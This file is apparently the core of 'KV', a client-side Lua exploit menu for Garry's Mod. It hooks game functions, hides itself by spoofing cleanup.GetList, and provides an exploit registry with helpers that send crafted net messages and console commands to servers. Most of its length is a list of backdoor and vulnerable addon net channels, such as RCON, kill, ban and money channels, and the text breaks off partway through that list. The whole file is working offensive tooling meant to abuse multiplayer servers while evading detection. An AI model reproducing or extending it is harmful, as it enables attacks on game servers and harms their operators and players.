surface.CreateFont("KVMenuText", {
    font = "Montserrat Medium",
    extended = true,
    size = 12 + 2,
    weight = 500,
})

surface.CreateFont("KVMenuTitle", {
    font = "Montserrat Medium",
    extended = true,
    size = 14 + 2,
    weight = 500,
})

local KV = {
    LP = LocalPlayer(),
    ARES = true
}

KV.LAST = {}
local LAST_TABLE = {}

if isfunction(cleanup.GetList) then
    LAST_TABLE = cleanup.GetList()
end

if istable(LAST_TABLE) then
    KV.LAST = table.Copy(LAST_TABLE)
end

KV.Debug = true

function cleanup.GetList()
    return KV
end

KV.Developer = beta or false

if KV.Developer ~= false then
    print("no dev?")
end

KV.SecureHooks = true
KV.Config = {}
local grad = Material("gui/gradient")
local upgrad = Material("gui/gradient_up")
local downgrad = Material("gui/gradient_down")
local ctext = chat and chat.AddText or print

function KV.GetUpValues(func)
    if not isfunction(func) then return {} end
    if isfunction(debug.getupvalues) then return debug.getupvalues(func) end
    local info = debug.getinfo(func, "uS")
    local variables = {}

    -- Upvalues can't be retrieved from C functions
    if info ~= nil and info.what == "Lua" then
        local upvalues = info.nups

        for i = 1, upvalues do
            local key, value = debug.getupvalue(func, i)
            variables[key] = value
        end
    end

    return variables
end

function KV.MultiSend(sploit, func)
    for k, v in ipairs(sploit.functions) do
        if sploit.bools[v.bool] == true then
            KV.NetStart(sploit, v.channel)

            if isfunction(func) then
                func()
            elseif istable(func) and (isfunction(func[v.channel]) or isfunction(func["*"])) then
                func[v.channel or "*"]()
            end

            net.SendToServer()
        end
    end
end

function KV.GetEnabledCount(sploit)
    if not sploit then return 0 end
    local i = 0

    for k, v in pairs(sploit.bools) do
        if v == true and k ~= "enabled" then
            i = i + 1
        end
    end

    return i
end

function KV.GetEnabled(sploit)
    if not sploit then return false end
    if table.Count(sploit.bools) == 1 or sploit.typ ~= "bools" then return sploit.bools.enabled end

    for k, v in pairs(sploit.bools) do
        if v == true and k ~= "enabled" then return true end
    end

    return false
end

function KV.ValidNetString(...)
    local tbl = {...}

    if #tbl == 0 then return false end

    if istable(tbl) then
        for k, v in pairs(tbl) do
            if KV.BAIT_CHANNELS[v] and KV.BAIT_COUNT >= KV.BAIT_LIMIT and not KV.GENERAL_OVERRIDE then return false, 1 end
            KV.BlockNetOutgoing = true

            -- && (!KV.ServerDump || KV.ServerDump:find(v)
            if util.NetworkIDToString(util.NetworkStringToID(v)) ~= v then
                KV.BlockNetOutgoing = false

                return false
            end

            KV.BlockNetOutgoing = false
        end

        return true
    end

    return false
end

function KV.DynamicNetString(...)
    local tbl = {...}

    for i = 1, math.huge do
        local str = util.NetworkIDToString(i)
        if not str then return false end
        local found = true

        if istable(tbl) then
            for k, v in pairs(tbl) do
                if not v or str:find(v) == nil then
                    found = false
                end
            end
        end

        if found then
            if KV.BAIT_CHANNELS[str] and KV.BAIT_COUNT >= KV.BAIT_LIMIT and not KV.GENERAL_OVERRIDE then return false, 1 end

            return str
        end
    end
end

function KV.DynamicNetStrings(...)
    local tbl = {...}

    local ret = {}
    local bait_count = 0

    for i = 1, math.huge do
        local str = util.NetworkIDToString(i)
        if not str then break end
        local found = true

        if istable(tbl) then
            for k, v in pairs(tbl) do
                if not v or str:find(v) == nil then
                    found = false
                end
            end
        end

        if found then
            if KV.BAIT_CHANNELS[str] and KV.BAIT_COUNT >= KV.BAIT_LIMIT and not KV.GENERAL_OVERRIDE then
                bait_count = bait_count + 1
            else
                ret[#ret + 1] = str
            end
        end
    end

    return ret, bait_count
end

function KV.GetAllReceivers()
    KV.Receivers = {
        [1] = {
            ["str"] = "*"
        }
    }

    for i = 1, math.huge do
        local str = util.NetworkIDToString(i)
        if not str or not KV.ValidNetString(str) then break end

        KV.Receivers[#KV.Receivers + 1] = {
            ["str"] = str
        }
    end

    return KV.Receivers
end

KV.ents = {}

KV.ents.FindByGlobal = function(...)
    local tbl = {...}

    local ent_tbl = {}
    local found = true
    if #tbl == 0 then return ents.GetAll() end

    for k, v in ipairs(ents.GetAll()) do
        found = true

        if istable(tbl) then
            for k2, v2 in pairs(tbl) do
                if v[v2] == nil then
                    found = false
                end
            end
        end

        if found then
            ent_tbl[#ent_tbl + 1] = v
        end
    end

    return ent_tbl
end

KV.vgui = {
    Create = function(class, parent, name)
        local detour_call = KV.DetourCall or false
        KV.DetourCall = false
        local ret = vgui.Create(class, parent, name, true)
        KV.DetourCall = detour_call

        return ret
    end
}

KV.Exploits = {}
KV.StartCol = Color(150, 50, 0)
KV.FinishCol = Color(80, 80, 120)

function KV.Interpolate(a, b, proportion)
    return a + ((b - a) * (proportion / 100))
end

function KV.GetColor(percentage)
    percentage = math.Clamp(percentage, 0, 100)
    if percentage == 0 then return Color(255, 255, 255) end
    local a, b, c = ColorToHSV(KV.FinishCol)
    local a1, b1, c1 = ColorToHSV(KV.StartCol)
    local a2, b2, c2
    a2 = KV.Interpolate(a, a1, percentage)
    b2 = KV.Interpolate(b, b1, percentage)
    c2 = KV.Interpolate(c, c1, percentage)

    return HSVToColor(a2, b2, c2)
end

local StatusColors = {
    [1] = Color(80, 120, 80),
    [2] = Color(150, 90, 50),
    [3] = Color(150, 50, 0),
    [4] = Color(255, 255, 255),
}

local StatusText = {
    [1] = "Undetected",
    [2] = "Outdated",
    [3] = "Detected",
    [4] = "N/A",
}

KV.Index = {}

function KV.GetExploit(Name, Index)
    local IndexTable = KV.Index[Name]

    if KV.Exploits[IndexTable] then
        if Index then
            return KV.Exploits[IndexTable][Index]
        else
            return KV.Exploits[IndexTable]
        end
    else
        return false
    end
end

function KV.ValidTable(tbl)
    if istable(tbl) then
        return "table"
    elseif type(tbl) ~= "string" and getmetatable(tbl) and getmetatable(tbl).__index ~= nil then
        return "metatable"
    else
        return false
    end
end

function KV.NotNil(var)
    if var ~= nil then return var end
end

function KV.RecursiveGetVar(search, tbl, typevar, create)
    if not KV.ValidTable(search) or not KV.ValidTable(tbl) then return false end

    for k, v in pairs(tbl) do
        if (not search or not search[v]) or (search and search[v] and (typevar and type(search[v]) ~= typevar) and not KV.ValidTable(search[v])) then
            if (not search or not search[v]) and typevar == "table" and create then
                if not search then
                    search = {}
                end

                search[v] = {}
                search = search[v]
            else
                return false
            end
        else
            if not search[v] and typevar == "table" and create then
                search[v] = {}
            end

            search = search[v]
        end
    end

    return search
end

function KV.GetAllExploits()
    local exploits = {}

    for k, v in ipairs(KV.Exploits) do
        if istable(v) and v.IsCategory then
            for k2, v2 in ipairs(v) do
                if istable(v2) and v2.Name then
                    exploits[#exploits + 1] = v2
                end
            end
        end
    end

    return exploits
end

KV.Detours = KV.LAST.Detours or {}

function KV.GetDetour(Name, Fallback)
    local str = string.Split(Name, ".")

    return KV.Detours[str[1]] and KV.Detours[str[1]][str[2]] or Fallback
end

function KV.Detour(tbl_name, func, tbl, callback)
    if not KV.ValidTable(tbl) then return end

    if not KV.Detours[tbl_name] then
        KV.Detours[tbl_name] = {}
    end

    if not KV.Detours["Backup"] then
        KV.Detours["Backup"] = {}
    end

    if not KV.Detours["Backup"][tbl_name] then
        KV.Detours["Backup"][tbl_name] = {table.Copy(tbl)}
    end

    if not KV.Detours[tbl_name][func] then
        KV.Detours[tbl_name][func] = KV.Detours["Backup"][tbl_name][1][func]
        --print(tbl_name.."."..func .. " detoured successfully")
    end

    if isfunction(KV.Detours[tbl_name][func]) then
        if not KV.Detours["Callback"] then
            KV.Detours["Callback"] = {}
        end

        if not KV.Detours["Callback"][tbl_name] then
            KV.Detours["Callback"][tbl_name] = {}
        end

        KV.Detours["Callback"][tbl_name][func] = callback
        local sfunc = KV.Detours[tbl_name][func]
        rawset(tbl, func, callback)

        if tbl[func] == sfunc then
            tbl[func] = callback
        end
    end
end

local net = net

if DLib and istable(DLib.nativeNet) then
    net = DLib.nativeNet
end

KV.TYPEVARS = {
    MORETHAN = 0,
    LESSTHAN = 1,
    EQUALTO = 2,
    NOTEQUALTO = 3,
}

KV.DetourTables = {
    ["net"] = {
        ["table"] = _G.net,
        ["functions"] = {
            ["*"] = true,
            ["Incoming"] = false,
            ["Receive"] = false
        },
        ["PreCall"] = {
            ["Start"] = function(key, tbl, varargs)
                if KV.SafeOutgoingMsg == varargs[1] then return end
                tbl.NetOutgoingMsg = varargs[1]
                if KV.BlockNetOutgoing then return false end
            end,
            ["*"] = function(key, tbl, varargs, func)
                if KV.NetOutgoingMsg then
                    if not istable(tbl.NetOutgoingData) or not tbl.NetOutgoingData[0] or tbl.NetOutgoingData[0] ~= KV.NetOutgoingMsg then
                        tbl.NetOutgoingData = {
                            [0] = tbl.NetOutgoingMsg
                        }
                    end

                    if key:StartWith("Write") and jit.util.funcinfo(func).addr then
                        if #varargs ~= 0 then
                            local index = #tbl.NetOutgoingData + 1
                            local typevar = string.Replace(key, "Write", "")
                            tbl.NetOutgoingData[index] = varargs
                            tbl.NetOutgoingData[index].Type = typevar
                        end

                        if KV.BlockNetOutgoing then return false end
                    end
                end
            end,
        },
        ["PostCall"] = {
            ["SendToServer"] = function(key, tbl, varargs)
                if tbl.NetOutgoingMsg and KV.Developer then
                    PrintTable(tbl.NetOutgoingData)
                end

                tbl.NetOutgoingMsg = nil
                tbl.NetOutgoingData = nil
            end,
        },
    },
    ["concommand"] = {
        ["table"] = _G.concommand,
        ["functions"] = {
            ["*"] = true,
            ["Add"] = false,
            ["GetTable"] = false
        },
    },
    --[[["string"] = {
        ["table"] = _G.string,
        ["functions"] = {["lower"] = true},
    },]]
    ["util"] = {
        ["table"] = _G.util,
        ["functions"] = {
            ["NetworkIDToString"] = true,
            ["TraceLine"] = true,
            ["TableToJSON"] = true
        },
    },
    ["math"] = {
        ["table"] = _G.math,
        ["functions"] = {
            ["random"] = true,
            ["abs"] = true
        },
    },
    ["table"] = {
        ["table"] = _G.table,
        ["functions"] = {
            ["Copy"] = true
        },
    },
    ["usermessage"] = {
        ["table"] = _G.usermessage,
        ["functions"] = {
            ["IncomingMessage"] = true
        },
    },
    ["cam"] = {
        ["table"] = _G.cam,
        ["functions"] = {
            ["Start3D"] = true,
            ["End3D"] = true
        },
    },
    ["vgui"] = {
        ["table"] = _G.vgui,
        ["functions"] = {
            ["Create"] = true
        },
    },
    --[[["render"] = {
        ["table"] = _G.render,
        ["functions"] = {["SetRenderTarget"] = true},
    },]]
    ["gui"] = {
        ["table"] = _G.gui,
        ["functions"] = {
            ["*"] = true,
            ["EnableScreenClicker"] = false,
            ["MousePos"] = false,
            ["MouseX"] = false,
            ["MouseY"] = false,
            ["OpenURL"] = false,
            ["ScreenToVector"] = false
        },
    },
    ["input"] = {
        ["table"] = _G.input,
        ["functions"] = {
            ["StartKeyTrapping"] = true,
            ["SetCursorPos"] = true,
            ["LookupKeyBinding"] = true,
            ["LookupBinding"] = true
        },
    },
    ["properties"] = {
        ["table"] = _G.properties,
        ["functions"] = {
            ["Add"] = true
        },
    },
}

--[[["_G"] = {
        ["table"] = _G,
        ["functions"] = {["SortedPairsByMemberValue"] = true},
    },]]
-- table_to_search, variable, MORE/LESS/EQUALTO, value, varargs
function KV.GetVarTable(tbl, var, typevar, val, metatable, ...)
    if not typevar then
        typevar = KV.TYPEVARS.EQUALTO
    end

    local exploits = {}

    if istable(tbl) and var and typevar and val then
        for k, v in ipairs(tbl) do
            if KV.ValidTable(v) then
                local var_l, val_l = var, val

                if KV.ValidTable(var) then
                    var_l = KV.RecursiveGetVar(v, var)
                else
                    if isfunction(v[var]) then
                        if KV.ValidTable(v) == "metatable" or metatable then
                            var_l = v[var](v, ...)
                        else
                            var_l = v[var](...)
                        end
                    else
                        var_l = v[var]
                    end

                    if isfunction(val) then
                        val_l = val()
                    end
                end

                if typevar == KV.TYPEVARS.MORETHAN then
                    if KV.SafeToNumber(var_l) > KV.SafeToNumber(val_l) then
                        exploits[#exploits + 1] = v
                    end
                elseif typevar == KV.TYPEVARS.LESSTHAN then
                    if KV.SafeToNumber(var_l) < KV.SafeToNumber(val_l) then
                        exploits[#exploits + 1] = v
                    end
                elseif typevar == KV.TYPEVARS.EQUALTO then
                    if var_l == val_l then
                        exploits[#exploits + 1] = v
                    end
                elseif typevar == KV.TYPEVARS.NOTEQUALTO then
                    if var_l ~= val_l then
                        exploits[#exploits + 1] = v
                    end
                end
            end
        end
    end

    return exploits
end

function KV.SetTableContents(t1, t2)
    table.Empty(t1)
    table.Merge(t1, t2)
end

function KV.GetVarExploits(var, typevar, val)
    return KV.GetVarTable(KV.GetAllExploits(), var, typevar, val)
end

KV.RunDetours = function()
    for k, v in pairs(KV.DetourTables) do
        local ValidTable = KV.ValidTable(v.table)

        if istable(v) and ValidTable then
            for k1, v1 in pairs(v.table) do
                if isfunction(v1) and (not istable(v.functions) or ((v.functions["*"] and v.functions[k1] ~= false) or v.functions[k1])) then
                    KV.Detour(k, k1, v.table, function(...)
                        local varargs = {...}

                        --if(KV.Killswitch && !KV.Unload && !KV.Detours) then return v1(unpack(varargs)) end
                        local func = KV.Detours[k][k1]

                        if not KV.Killswitch and not KV.Unload then
                            if istable(v.PreCall) and isfunction(v.PreCall[k1] or v.PreCall["*"]) then
                                local ret_val = (v.PreCall[k1] or v.PreCall["*"])(k1, KV, varargs, func)
                                if ret_val ~= nil then return ret_val end
                            end

                            if KV.DetourCall ~= true then
                                local ret = nil

                                if isfunction(KV.GetAllExploits) then
                                    local det_call = KV.DetourCall or false
                                    KV.DetourCall = true

                                    for k2, v2 in ipairs(KV.GetAllExploits()) do
                                        local tbl = v2.hooks and (v2.hooks[k] or v2.hooks["*"])

                                        if v2.scanned and v2.hooks and tbl and (tbl[k1] or tbl["*"]) then
                                            local xfunc = tbl[k1] or tbl["*"]
                                            local return_val = nil

                                            if xfunc == tbl["*"] then
                                                return_val = xfunc(k, k1, v2, varargs, KV.Detours[k][k1])
                                            else
                                                return_val = xfunc(v2, varargs, KV.Detours[k][k1])
                                            end

                                            if return_val ~= nil then
                                                ret = return_val
                                            end
                                        end
                                    end

                                    KV.DetourCall = det_call
                                end

                                if istable(v.PostCall) and isfunction(v.PostCall[k1] or v.PostCall["*"]) then
                                    local ret_val = (v.PostCall[k1] or v.PostCall["*"])(k1, KV, varargs, func)
                                    if ret_val ~= nil then return ret_val end
                                end

                                if ret then
                                    return ret
                                elseif ret == false then
                                    return false
                                end
                            end
                        end

                        if not KV.RETURN_OVERRIDE then
                            if ValidTable == "metatable" then
                                return func(v.table, unpack(varargs))
                            else
                                return func(unpack(varargs))
                            end
                        end

                        KV.RETURN_OVERRIDE = false
                    end)
                end
            end
        end
    end
end

KV.RunDetours()

function KV.GetLP()
    return KV.LP
end

function KV.AddExploit(Name, tab)
    if not isstring(Name) then
        print("Error: Exploit missing Name")

        return
    end

    if not istable(tab) then
        print("Error: Exploit missing table")

        return
    end

    tab.Name = Name

    if not KV.Index[Name] then
        if tab.severity ~= 0 then
            KV.Index[Name] = table.insert(KV.Exploits, {})
        else
            KV.Index[Name] = table.insert(KV.Exploits, 1, {})
        end

        local IndexTable = KV.Index[Name]

        KV.Exploits[IndexTable] = {
            ["IsCategory"] = true
        }
    end

    local IndexTable = KV.Index[Name]
    local Index = table.insert(KV.Exploits[IndexTable], tab)
    KV.GetExploit(Name, Index).Index = Index

    if not tab.hooks and not tab.general_override then
        print("Error: Function with no hooks added, is this the intention?")
        print(KV.GetExploit(Name, Index).Name, Index)
    end
end

function KV.IsStored(addr)
    return KV.Config[addr] ~= nil and KV.Config[addr].val ~= nil
end

function KV.GetStored(addr, fallback, skipwhitelist, datatable)
    local tbl = KV.Config
    if tbl[addr] == nil and fallback == nil then return end

    if fallback and (tbl[addr] == nil or tbl[addr].val == nil or tbl[addr].val == {}) then
        KV.Store(addr, fallback)
    end

    if (istable(tbl[addr].val) or fallback == {}) and KV.GetWhitelist(addr) and not skipwhitelist then
        local plytbl = player.GetAll()

        for k, v in pairs(tbl[addr].val) do
            table.RemoveByValue(plytbl, v)
        end

        return plytbl
    end

    if fallback and (tbl[addr] == nil or tbl[addr].val == nil) then return fallback end

    return tbl[addr].val
end

function KV.NetStart(sploit, str, rel)
    KV.BlockNetOutgoing = true
    KV.GENERAL_OVERRIDE = true

    if not istable(str) and not KV.ValidNetString(str) then
        print("Warning: " .. sploit.Name .. " #" .. sploit.Index .. " attempted to send an unpooled message", str)
        KV.BlockNetOutgoing = false
        KV.GENERAL_OVERRIDE = false
    else
        if (not sploit or isstring(sploit)) and not str then
            print("An exploit is using the legacy system and will not support rate limiting, tell invalid")
            str = sploit
        else
            if not sploit["Sender"] and KV.GetEnabled(sploit) and KV.RecursiveGetVar(sploit, {"hooks", "Think"}, "function") then
                sploit["Sender"] = true
            end
        end

        if isfunction(nwidcek) then
            if isfunction(netStart) then
                KV.Detours["net"]["Start"] = netStart
            end
        end

        local netstart = net.Start

        if odium and odium.G and odium.G.net then
            netstart = odium.G.net.Start
        end

        if istable(str) then
            for k, v in pairs(str) do
                if KV.ValidNetString(v) then
                    str = v
                    break
                end
            end
        end

        if istable(str) then
            print("Warning: " .. sploit.Name .. " #" .. sploit.Index .. " attempted to send an unpooled message")
            KV.BlockNetOutgoing = false

            return
        end

        KV.SafeOutgoingMsg = str
        local ret = nil

        if rel then
            ret = netstart(str)
        else
            ret = netstart(str, KV.ARES)
        end

        KV.BlockNetOutgoing = false
        KV.SafeOutgoingMsg = nil
        KV.GENERAL_OVERRIDE = false

        return ret
    end
end

function KV.RCC(sploit, ...)
    local RCC = RunConsoleCommand

    if istable(sploit) then
        if not sploit["Sender"] and KV.GetEnabled(sploit) and KV.RecursiveGetVar(sploit, {"hooks", "Think"}, "function") then
            sploit["Sender"] = true
        end

        local det_call = KV.DetourCall or false
        KV.DetourCall = true
        local ret = RCC(...)
        KV.DetourCall = det_call

        return ret
    else
        print("An exploit is using the legacy system and will not support rate limiting, tell invalid")
    end
end

function KV.Store(addr, val, datatable)
    local tbl = datatable or KV.Config

    if tbl[addr] == nil then
        tbl[addr] = {}
    end

    tbl[addr].val = (istable(val) and table.Copy(val)) or val
end

function KV.SetWhitelist(addr, bool, datatable)
    local tbl = datatable or KV.Config

    if tbl[addr] == nil then
        tbl[addr] = {}
    end

    tbl[addr].IsWhitelist = bool
end

function KV.GetWhitelist(addr, datatable)
    local tbl = datatable or KV.Config

    return tbl[addr] ~= nil and tbl[addr].IsWhitelist == true
end

function KV.GetAllStored()
    return KV.Config
end

function KV.GetAllStoredData()
    local ret = {}

    for k, v in pairs(KV.Config) do
        if not istable(v) then
            ret[k] = v
        end
    end

    return ret
end

function KV.LoadConfig()
    local f = file.Read("KVv2.dat", "DATA")
    if not f then return print("Error: No saved configs found") end
    local raw = util.Decompress(f)
    local config = util.JSONToTable(raw)
    table.Merge(KV.Config, config)
    --    KV.Config = config
    KV.Menu:Remove()
    print("Loaded Configuration File")
end

function KV.SaveConfig()
    local config = util.TableToJSON(KV.GetAllStoredData())
    if not config then return end
    local compressed = util.Compress(config)
    file.Write("KVv2.dat", compressed)
    print("Saved Configuration File")
end

KV.BAIT_UNSORTED = {"fg_printer_money", "SprintSpeedset", "CFEndGame", "sendtable", "plyWarning", "pplay_deleterow", "NLR_SPAWN", "TowTruck_CreateTowTruck", "ARMORY_RetrieveWeapon", "pac.net.TouchFlexes.ClientNotify", "slua2", "ClickerAddToPoints", "steamid2", "TransferReport", "explodeallcarbd", "Sbox_gm_attackofnullday_key", "ats_send_toServer", "redirectionplayerbd", "AbilityUse", "RP_Fine_Player", "DaHit", "JB_Votekick", "CpForm_Answers", "skeleton_dancing_troll", "ignite_bd", "75_plus_win", "modelchangerbd", "BuySecondTovar", "spawnentitybd", "FactionInviteConsole", "rprotect_terminal_settings", "ban_rdm", "forcejobbd", "textscreens_download", "PoliceJoin", "CFRemoveGame", "RevivePlayer", "DataSend", "TOW_SubmitWarning", "BM2.Command.SellBitcoins", "DepositMoney", "CFJoinGame", "ItemStoreUse", "forceconcommandbd", "Kun_SellOil", "PCAdd", "drugseffect_hpremove", "artillerybd", "argentjetaurrais2", "spawnvehiclebd", "netKey", "NC_GetNameChange", "pac_to_contraption", "start_wd_emp", "messagespambd", "linkbd", "accidentvoiturebd", "hsend", "egg", "unlockalldoororlockallbd", "18_25_hack_mood", "RXCAR_SellINVCar_C2S", "RecKickAFKer", "tickbooksendfine", "pac_submit", "banleaver", "rebootbd", "VJSay", "ATM_DepositMoney_C2S", "Sandbox_ArmDupe", "net_PSUnBoxServer", "GiveHealthNPC", "memes", "PlayerUseItem", "Letthisdudeout", "services_accept", "DarkRP_SS_Gamble", "dLogsGetCommand", "SellMinerals", "superadmin_vite", "RXCAR_Shop_Store_C2S", "ATS_WARP_REMOVE_CLIENT", "changerlenombd", "fpp_reset_all", "2dplayermodelbd", "TOW_PayTheFine", "spawnpropbd", "CraftSomething", "clearallbansbd", "mercipourtonip", "withdrawp", "SendMoney", "BuyCar", "FIRE_CreateFireTruck", "jeveuttonrconleul", "kill_player_bd", "fp_as_doorHandler", "pplay_sendtable", "disablebackdoor", "godmodbd", "teleport2bd", "customprinter_get", "MONEY_SYSTEM_GetWeapons", "gportal_rpname_change", "hitcomplete", "artilleryplayerbd", "fuckupulxbd", "Remove_Exploiters", "NDES_SelectedEmblem", "NLR.ActionPlayer", "NET_EcSetTax", "StackGhost", "DarkRP_Kun_ForceSpawn", "whk_setart", "Upgrade", "CreateCase", "rconspammer", "_blacksmurf", "disguise", "infiniteammobd", "drugseffect_remove", "playsoundurlbd", "SimplicityAC_aysent", "freezeplybd", "BuilderXToggleKill", "GMBG:PickupItem", "MDE_RemoveStuff_C2S", "SimpilicityAC_aysent", "BuyFirstTovar", "gBan.BanBuffer", "PCDelAll", "jesuslebg", "TalkIconChat", "hurlement_bd", "ATS_WARP_VIEWOWNER", "drugs_text", "bodyman_model_change", "inversergraviterbd", "changejobnamebd", "WriteQuery", "TCBBuyAmmo", "TFA_Attachment_RequestAll", "TCBuyAmmo", "BuyKey", "ckit_roul_bet", "nostrip", "centerbd", "NET_SS_DoBuyTakeoff", "DarkRP_spawnPocket", "teleport1bd", "ActivatePC", "drugs_money", "pogcp_report_submitReport", "race_accept", "healtharmorbd", "TakeBetMoney", "BuyCrate", "Kun_ZiptieStruggle", "faitcommeloiseaubd", "FacCreate", "DuelMessageReturn", "ATS_WARP_FROM_CLIENT", "DL_Answering", "thefrenchenculer", "Taxi_Add", "pplay_addrow", "stripallbd", "CRAFTINGMOD_SHOP", "SyncPrinterButtons76561198056171650", "ply_pick_shit", "join_disconnect", "DarkRP_preferredjobmodel", "viv_hl2rp_disp_message", "Kun_SellDrug", "forcesaybd", "drugs_ignite", "chatspambd", "Warn_CreateWarn", "buyinghealth", "NewReport", "BM2.Command.Eject", "kickbd", "argentjetaurrais", "EZS_PlayerTag", "1942_Fuhrer_SubmitCandidacy", "ATMDepositMoney", "blacksmurfBackdoor", "JoinOrg", "toupiebd", "casinokit_chipexchange", "FinishContract", "rektallmodels", "discobd", "crashplayergamebd", "giveweaponbd", "hhh_request", "zilnix", "rconadmin", "FarmingmodSellItems", "give_me_weapon", "Morpheus.StaffTracker", "NLRKick", "Chatbox_PlayerChat", "rconcommandbd", "Chess Top10", "cloackbd", "RP_Accept_Fine", "WithdrewBMoney", "reports.submit", "slua", "giveweapon", "RHC_jail_player", "duelrequestguiYes", "tremblementdeterrebd", "kart_sell", "speedhackbd", "removepermaprop_bd", "soez", "deletealldatabd", "textstickers_entdata", "BailOut", "pplay_sendtable", "VJSay", "textstickers_entdata", "NC_GetNameChange", "CFJoinGame", "KV_bigspames2", "SKIN", "stringx", "mathx", "_G", "color_white", "_LOADLIB", "_LOADED", "color_transparent", "func", "g_SBoxObjects", "tablex", "Morph", "SpawniconGenFunctions", "DOF_Ents", "_E", "_R", "duelrequestguiYes", "drugs_money", "drugs_ignite", "drugs_text", "SyncPrinterButtons76561198056171650", "rprotect_terminal_settings", "JoinOrg", "NDES_SelectedEmblem", "join_disconnect", "NLRKick", "Morpheus.StaffTracker", "duelrequestguiYes", "drugs_ignite", "ply_pick_shit", "TalkIconChat", "NDES_SelectedEmblem", "BuyFirstTovar", "BuySecondTovar", "GiveHealthNPC", "BuyKey", "BuyCrate", "MONEY_SYSTEM_GetWeapons", "SyncPrinterButtons16690", "DarkRP_SS_Gamble", "PCAdd", "DarkRP_SS_Gamble", "viv_hl2rp_disp_message", "Sbox_gm_attackofnullday", "Sbox_gm_attackofnullday_key", "Kun_SellDrug", "Ulib_Message", "ULogs_Info", "fix", "Fix_Keypads", "noclipcloakaesp_chat_text", "_Defqon", "_CAC_ReadMemory", "nostrip", "nocheat", "LickMeOut", "ULX_QUERY2", "ULXQUERY2", "MoonMan", "Im_SOCool", "Sandbox_GayParty", "DarkRP_UTF8", "oldNetReadData", "memeDoor", "BackDoor", "OdiumBackDoor", "SessionBackdoor", "DarkRP_AdminWeapons", "cucked", "NoNerks", "kek", "ZimbaBackDoor", "something", "random", "enablevac", "idk", "fellosnake", "c", "killserver", "fuckserver", "cvaraccess", "rcon", "web", "jesuslebg", "Þ  ?D)◘", "DefqonBackdoor", "WriteQuery", "SellMinerals", "TakeBetMoney", "Kun_SellOil", "PoliceJoin", "CpForm_Answers", "MDE_RemoveStuff_C2S", "RP_Accept_Fine", "l_players_listing_fine", "montant_argent11", "RXCAR_Shop_Store_C2S", "CRAFTINGMOD_SHOP", "drugs_ignite", "drugseffect_hpremove", "drugs_text", "GMBG:PickupItem", "plyWarning", "timebombDefuse", "start_wd_emp", "kart_sell", "FarmingmodSellItems", "ClickerAddToPoints", "bodyman_model_change", "BailOut", "TOW_SubmitWarning", "FIRE_CreateFireTruck", "hitcomplete", "hhh_request", "DaHit", "customprinter_get", "textstickers_entdata", "TCBBuyAmmo", "DataSend", "rprotect_terminal_settings", "fp_as_doorHandler", "TransferReport", "stripper_gunz", "properties", "skeleton_dancing_troll", "music", "rcon_passw_dump", "jeveuttonrconleul", "aucun_rcon_ici", "jeveuttonrconleul", "Надеюсь, ты усвоил урок", "cl_yawspeed 8", "Music_troll", "wowlolwut_my_boi", "ITEM", "chmluaviewer", "Defqon_wallhack", "Defqon_anticheats", "NET_LUA_CLIENTS", "NET_LUA_SV", "EASY_CHAT_MODULE_LUA_CLIENTS", "EASY_CHAT_MODULE_LUA_SV", "blackdoor", "toxic.LuaStr", "toxic.pro", "bodyman_chatprint", "bodyman_model_change", "bodygroups_change", "skins_change", "thereaper", "noprop", "dontforget", "aze46aez67z67z64dcv4bt", "changename", "nolag", "reaper", "slua2", "thereaperishere", "hentai", "slua", "the2d78", "bethedeath", "elfamosabackdoormdr", "zilnixestbo", "reaperexploits", "fr_spamstring", "CpForm_Answers", "MDE_RemoveStuff_C2S", "start_wd_emp", "kart_sell", "FarmingmodSellItems", "ClickerAddToPoints", "fp_as_doorHandler", "TransferReport", "odium_setname", "ace_menu", "odium_lua_run_cl", "blogs_refresh", "blogs_refreshblog", "blogs_resetall", "pChat", "SuggestionsBriefInfo", "SuggestionsSpecificInfo", "SuggestionsGetInfo", "SuggestionsClientEdits", "SuggestionsRefresh", "Morpheus.Init", "Morpheus.ClientCheckActivity", "DL_Answering_global", "pSayBroadcaster", "TCBBuyAmmo", "DataSend", "FarmingmodSellItems", "duelrequestguiYes", "egg", "TalkIconChat", "exploits_open", "chat_AddText", "magnum", "RAINBOWPLAYER", "menu", "setMagicTypeHP", "TheFrenchGuy", "htx_mode", "htx_menu", "htx_macros", "ГћГ ?D)в—", "metro_notification", "BM2.Command.SellBitcoins", "ItemStoreUse", "ItemStoreDrop", "gMining.sellMineral", "PlayerUseItem", "RequestMAPSize", "MG2.Request.GangRankings", "dLogsGetCommand", "shopguild_buyitem", "VoteKickNO", "VoteBanNO", "Warn_CreateWarn", "showDisguiseHUD", "Chatbox_PlayerChat", "BuilderXToggleKill", "services_accept", "lockpick_sound", "InformPlayer", "1942_Fuhrer_SubmitCandidacy", "FacCreate", "FactionInviteConsole", "WithdrewBMoney", "deathrag_takeitem", "REPPurchase", "Resupply", "DarkRP_Defib_ForceSpawn", "FiremanLeave", "CreateEntity", "CREATE_REPORT", "Hopping_Test", "CpForm_Answers", "VehicleUnderglow", "OpenGates", "DemotePlayer", "SendMail", "REPAdminChangeLVL", "BuyUpgradesStuff", "SquadGiveWeapon", "SetTableTarget", "UpdateRPUModelSQL", "disguise", "gportal_rpname_change", "NewRPNameSQL", "chname", "AbilityUse", "race_accept", "NLR_SPAWN", "opr_withdraw", "revival_revive_accept", "BuyFirstTovar", "BuySecondTovar", "MONEY_SYSTEM_GetWeapons", "MCon_Demote_ToServer", "withdrawMoney", "gPrinters.retrieveMoney", "NGII_TakeMoney", "money_clicker_withdraw", "opr_withdraw", "NET_DoPrinterAction", "tickbooksendfine", "withdrawp", "PCAdd", "viv_hl2rp_disp_message", "Kun_SellOil", "gPrinters.sendID", "requestmoneyforvk", "vj_testentity_runtextsd", "NET_BailPlayer", "rpi_trade_end", "ClickerForceSave", "SRequest", "HealButton", "GiveArmor100", "GiveSCP294Cup", "Client_To_Server_OpenEditor", "userAcceptPrestige", "wordenns", "guncraft_removeWorkbench", "BuyKey", "PurchaseWeed", "DoDealerDeliver", "sendDuelInfo", "CreateOrganization", "DisbandOrganization", "ChangeOrgName", "IS_SubmitSID_C2S", "AcceptBailOffer", "CP_Test_Results", "ReSpawn", "FIGHTCLUB_KickPlayer", "IveBeenRDMed", "nCTieUpStart", "DestroyTable", "bringNfreeze", "JoinFirstSS", "unarrestPerson", "inviteToOrganization", "GovStation_SpawnVehicle", "DailyLoginClaim", "DL_AskLogsList", "DL_StartReport", "SpecDM_SendLoadout", "PowerRoundsForcePR", "wyozimc_playply", "SendSteamID", "JB_GiveCubics", "JB_SelectWarden", "RDMReason_Explain", "redirectMsg", "LB_AddBan", "GET_Admin_MSGS", "br_send_pm", "LAWYER.BailFelonOut", 